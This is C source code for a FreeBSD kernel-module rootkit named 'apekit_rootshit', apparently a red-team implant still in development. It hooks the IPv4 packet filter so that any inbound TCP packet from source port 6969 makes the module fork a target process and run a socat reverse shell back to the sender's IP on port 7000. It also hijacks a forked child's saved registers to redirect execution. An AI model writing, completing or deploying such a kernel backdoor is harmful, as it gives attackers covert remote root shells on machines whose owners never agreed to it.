#include <sys/param.h>
#include <sys/module.h>
#include <sys/kernel.h>
#include <sys/socketvar.h>
#include <sys/protosw.h>
#include <sys/systm.h>
#include <sys/types.h>
#include <sys/mbuf.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/proc.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/exec.h>
#include <net/pfil.h>
#include <netinet/ip_var.h>
#include <net/if.h>
#include <sys/syslog.h>
#include <sys/eventhandler.h>
#include <sys/libkern.h>  // Kernel-space string functions
#include <sys/sx.h> // for finding proc
#include <sys/queue.h> // for finding proc
#include <sys/lock.h>     // Locking mechanisms
#include <sys/sched.h>    // Needed for FIRST_THREAD_IN_PROC()
#include <sys/unistd.h> // for RFPROC
#include <sys/imgact.h> // For image_args
#include <amd64/include/pcb.h> // for pcb struct
// all the retarded includes for pcb
#include <amd64/include/fpu.h>
#include <amd64/include/segments.h>
#include <amd64/include/tss.h>
// for curenthread
#include <sys/pcpu.h>
// for ck_stailq_first
#include <contrib/ck/include/ck_queue.h>


// since BSD is gay as hell and doesn't provide headers for these we declare them as external
extern int kern_execve(struct thread *td, struct image_args *args, struct mac *mac_p,
    struct vmspace *oldvmspace);

// Replaces all instances of TRIGGER_PORT in the code with 6969 before compilation
#define TRIGGER_PORT 6969
#define LISTEN_PORT 7000
#define TARGET_PROC "apeshit"
// Global dynamic string for reverse shell
char reverse_shell_cmd[100];
// Define stack protection so we can use snprintf
// Define the stack protector guard
uintptr_t __stack_chk_guard = 0xDEADBEEFCAFEBABE;
// Define the stack protection failure handler
static void __stack_chk_fail(void) {
    panic("Kernel stack smashing detected!");
}

/*
custom exec_copyin_args that won't break
*/

static int custom_copin_args_for_exec(struct image_args *args, const char *fname, enum uio_seg segflg, char **argv, char **envv) {
    u_long arg, env;
    int error;

    bzero(args, sizeof(*args));
    if (argv == NULL) {
        return (EFAULT);
    }

    /*
     * Allocate demand-paged memory for the file name, argument, and
     * environment strings.
     */
    error = exec_alloc_args(args);
    if (error != 0) {
        return (error);
    }

    /*
     * Copy the file name.
     */
    error = exec_args_add_fname(args, fname, segflg);
    if (error != 0) {
        printf("error at line %d\n", __LINE__);
        return error;
    }
    /*
     * extract arguments first
     */
    for (;;) {
        arg = (u_long)*argv++;
        if (arg == 0) {
            break;
        }
        error = exec_args_add_arg(args, (char *)(uintptr_t)arg,
          UIO_SYSSPACE);
        if (error != 0) {
            printf("error at line %d\n", __LINE__);
            break;
        }
    }

    /*
     * extract environment strings
     */
    if (envv) {
        for (;;) {
            env = (u_long)*envv++;
            if (env == 0) {
                break;
            }
            error = exec_args_add_env(args,
                (char *)(uintptr_t)env, UIO_SYSSPACE);
            if (error != 0) {
            printf("error at line %d\n", __LINE__);
            break;
            }
        }
    }

    return (error);
}

/*
custom func to call exec shit
*/
static void custom_forkret_to_execve(struct thread *td, struct trapframe *frame) {

    struct image_args args;
    int error;
    // Define command and arguments: /bin/sh -c "echo hello"
    char *argv[] = { "/bin/sh", "-c", reverse_shell_cmd, NULL };
    char *envp[] = { "PATH=/bin:/usr/bin", NULL };  // Basic environment

        // correct signature

    error = custom_copin_args_for_exec(&args, argv[0], UIO_SYSSPACE, (char**)&argv, (char**)&envp);

    if (error != 0) {
        printf("[LKM] exec_copyin_args failed: %d\n", error);
        return;
    }

    // give it the current thread
    struct thread *curr_td = curthread;  // Macro to get current thread
    printf("Current thread ID: %d\n", curr_td->td_tid);


    error = kern_execve(curr_td, &args, NULL, NULL);
    if (error != 0) {
        printf("[LKM] kern_execve returned: %d\n", error);
    }

}


/*
 * Start of hooking fork and shoving my big fat juicy execve in there
 * Custom func that will be invoked whenever do_fork() is invoked
*/

static void my_fork_hook(void *arg, struct proc *parent, struct proc *child, int flags) {

    if (strcmp(parent->p_comm, TARGET_PROC) != 0) {
        // do no custom functionality if this is a normal fork call
        return;
    }

    struct thread *child_td;

    child_td = FIRST_THREAD_IN_PROC(child);
    if (child_td == NULL) {
        printf("[LKM] Failed to get first thread of child process!\n");
        return;
    }

    // this is the right way to do it but it wayyyyy complicated
    // hijack pcb_rip to point from fork_trampoline to kern_execve()
    struct pcb *pcb2;
    // Get the PCB (Process Control Block) of the child thread 
    // struct pcb *pcb2 = p2->p_threads.td_pcb; chat alos gave this line idk why its different
    pcb2 = child_td->td_pcb;
    if (pcb2 == NULL) {
        printf("[DEBUG] PCB is NULL, cannot modify it.\n");
        return;
    }

    // this line is causing a kernel panic
    // this line is causing a kernel panic
    // this line is causing a kernel panic
    // we are going to try and do a full fork stack setting this func up correctly
    // pcb2->pcb_rip = (register_t)func_pcbrip_points_to;

    // testing if its the modification
    pcb2->pcb_r12 = (register_t)custom_forkret_to_execve;




}

// used to register our func to the kernel
static eventhandler_tag my_fork_tag;
// registers custom func to kernel
// EVENTHANDLER_DIRECT_INVOKE(process_fork, p1, p2, fr->fr_flags);
// The above line invokes process_fork and below we register to process_fork
static void load_custom_fork_event_handler(void) {
    my_fork_tag = EVENTHANDLER_REGISTER(process_fork, my_fork_hook, NULL, EVENTHANDLER_PRI_ANY);
    printf("[LKM] process_fork handler registered!\n");
}
// unregisters custom func to kernel
static void unload_custom_fork_event_handler(void) {
    if (my_fork_tag != NULL)
        EVENTHANDLER_DEREGISTER(process_fork, my_fork_tag);
    printf("[LKM] process_fork handler unregistered!\n");
}



static struct proc *find_process_by_name(const char *name) {
    struct proc *p;

    sx_slock(&allproc_lock);  // Lock process list
    LIST_FOREACH(p, &allproc, p_list) {
        PROC_LOCK(p);
        if (strcmp(p->p_comm, name) == 0) {
            PROC_UNLOCK(p);
            sx_sunlock(&allproc_lock);
            return p;  // Return first found instance
        }
        PROC_UNLOCK(p);
    }
    sx_sunlock(&allproc_lock);

    return NULL;  // No matching process found
}

/*
 * Start of custom packet filtering
 * Global variables to hold references to our head and hook.
 * We need these in order to unlink/unregister them during unload.
 */
static pfil_head_t g_ph    = NULL;
static pfil_hook_t g_hook  = NULL;
// Helper function to see if the resource costly <m_pullup()> is needed for pakcet filtering
static inline int m_pullup_needed(struct mbuf *m, int needed_len) {
    return (m->m_len < needed_len) || ((m->m_next != NULL) && (m->m_pkthdr.len < needed_len));
}
// Additional custom packet filter
static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int dir, void *arg, struct inpcb *inp) {
    struct mbuf *m = *mp;
    struct ip *ip_header;
    struct tcphdr *tcp_header;

    // Ensure mbuf is valid
    if (m == NULL) return PFIL_PASS;

    // Ensure the mbuf has at least an IP header
    if (m->m_len < sizeof(struct ip)) {
        return PFIL_PASS;  // Ignore tiny/malformed packets
    }

    // Extract IP header
    ip_header = mtod(m, struct ip *);

    // Ensure it's a TCP packet
    if (ip_header->ip_p != IPPROTO_TCP) {
        return PFIL_PASS;
    }

    // Compute the required header size (IP + TCP)
    int header_size = (ip_header->ip_hl << 2) + sizeof(struct tcphdr);

    // Check if data is contiguous in the mbuf
    if (!m_pullup_needed(m, header_size)) {
        // Directly extract TCP header if pullup is not needed
        tcp_header = (struct tcphdr *)((u_char *)ip_header + (ip_header->ip_hl << 2));
    } else {
        // Perform m_pullup() only if required
        m = m_pullup(m, header_size);
        if (m == NULL) return PFIL_PASS;  // Drop if pullup fails

        // Recalculate headers after pullup
        ip_header = mtod(m, struct ip *);
        tcp_header = (struct tcphdr *)((u_char *)ip_header + (ip_header->ip_hl << 2));
    }

    // Check TCP source port
    if (ntohs(tcp_header->th_sport) != 6969) {
        return PFIL_PASS;
    }

    // Now we know the packet is a red-team packet

    // Create a string of the attacker source IP
    char attacker_ip_str[INET_ADDRSTRLEN];  // Buffer for IP string
    snprintf(attacker_ip_str, sizeof(attacker_ip_str), "%d.%d.%d.%d",
        (ntohl(ip_header->ip_src.s_addr) >> 24) & 0xFF,
        (ntohl(ip_header->ip_src.s_addr) >> 16) & 0xFF,
        (ntohl(ip_header->ip_src.s_addr) >> 8) & 0xFF,
        (ntohl(ip_header->ip_src.s_addr)) & 0xFF);

    printf("Kernel IP Address: %s\n", attacker_ip_str);


    // make this gloabl
    // char reverse_shell_cmd[100];
    snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
       "/usr/local/bin/socat TCP:%s:%d EXEC:/bin/sh", attacker_ip_str, LISTEN_PORT);


    printf("%s\n", reverse_shell_cmd);
    //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);



        // step through sys_fork()
        struct proc *parent_proc;
        struct thread *parent_td;
        struct fork_req fr;
        struct proc *new_proc;
        int error, new_pid;

        // Find the process "apeshit"
        parent_proc = find_process_by_name(TARGET_PROC);
        if (parent_proc == NULL) {
            printf("[LKM] No running process named '%s' found.\n", TARGET_PROC);
            return PFIL_PASS;
        }
        // Get the first thread of that process
        parent_td = FIRST_THREAD_IN_PROC(parent_proc);

        bzero(&fr, sizeof(fr));
        fr.fr_flags = RFPROC;
        fr.fr_pidp = &new_pid;
        fr.fr_procp = &new_proc;

        // Fork from the found process
        error = fork1(parent_td, &fr);
        if (error) {
            printf("[LKM] Fork failed: %d\n", error);
            return PFIL_PASS;
        }


    printf("Packet with source port 6969 detected!!\n");
    return PFIL_PASS;

}


static int get_pfil_head(void) {
    // Retrieve the existing IPv4 filtering head
    g_ph = V_inet_pfil_head;

    if (g_ph == NULL) {
        printf("[LKM] Failed to get existing IPv4 pfil_head\n");
        return (ENOENT);
    }

    return (0);

}


// Load function: Attach our packet filter
static int load_hook(void) {

    struct pfil_hook_args ha = {
        .pa_version = PFIL_VERSION,         // Version of the pfil framework
        .pa_flags = 0,                       /* Not specifying PFIL_IN/PFIL_OUT here */
        .pa_type = PFIL_TYPE_IP4,            // Type of filter (address family)
        .pa_mbuf_chk = my_packet_filter,       // Function to process packets
        .pa_mem_chk = NULL,                 // No memory-based checks (set to NULL if unused)
        .pa_ruleset = NULL,                 // No custom ruleset (set to NULL if unused)
        .pa_modname = "apeshit filtering",          // Module name
        .pa_rulname = "apeshit 6969 packet"             // Rule name
    };

    // pfil_hook_t	pfil_add_hook(struct pfil_hook_args *);
    g_hook = pfil_add_hook(&ha);

    if (g_hook == NULL) {
        // Handle error
        printf("mannnn that shit aint work");
        return (ENOMEM);
    }

    printf("[LKM] Packet filter module loaded\n");
    return 0;
}

static int load_link(void) {

    struct pfil_link_args la = {
        .pa_version = PFIL_VERSION,
        .pa_flags   = PFIL_IN | PFIL_HEADPTR | PFIL_HOOKPTR,
        .pa_head    = g_ph,
        .pa_hook    = g_hook,
    };

    int err = pfil_link(&la);
    if (err != 0) {
        printf("[LKM] pfil_link failed: %d\n", err);
        return err;
    }
    printf("[LKM] pfil_link success for inbound packets\n");
    return 0;
}

static void unload(void) {
    if (g_hook) {
        pfil_remove_hook(g_hook);
        g_hook = NULL;
        printf("[LKM] pfil_hook removed\n");
    }
    unload_custom_fork_event_handler();
}


typedef CK_STAILQ_HEAD(pfil_chain, pfil_link)	pfil_chain_t;
struct pfil_head {
	int		 head_nhooksin;
	int		 head_nhooksout;
	pfil_chain_t	 head_in;
	pfil_chain_t	 head_out;
	int		 head_flags;
	enum pfil_types	 head_type;
	LIST_ENTRY(pfil_head) head_list;
	const char	*head_name;
};


static void unregister_all_hooks(pfil_chain_t chain) {
    // struct pfil_link *link;

    // while (!CK_STAILQ_EMPTY(chain)) {
    //     link = CK_STAILQ_FIRST(chain);
    //     pfil_remove_hook(link->pfil_hook);
    // }
    printf("all hooks should be removed from v_inet now");
}


static int event_handler(struct module *module, int event, void *arg) {
    switch (event) {
        case MOD_LOAD:
            // load_head_case = load_head();
            // load_hook_case = load_hook();
            // load_link_case = load_link();
            // load_head();
            // should test is we actually got each one before continueing 
            get_pfil_head();
            // unregister hooks for v_inet
            pfil_head_t v_inet = V_inet_pfil_head;

            unregister_all_hooks(&v_inet->head_in);
            unregister_all_hooks(&v_inet->head_out);
            // load shit
            load_hook();
            load_link();
            load_custom_fork_event_handler();
            return 0;
        case MOD_UNLOAD:
            unload();
            printf("[LKM] Module unloaded.\n");
            return 0;
        default:
            return EOPNOTSUPP;
    }
}


static moduledata_t module_data = {
    "apekit_rootshit",
    event_handler,
    NULL
};

DECLARE_MODULE(reverse_shell_lkm, module_data, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);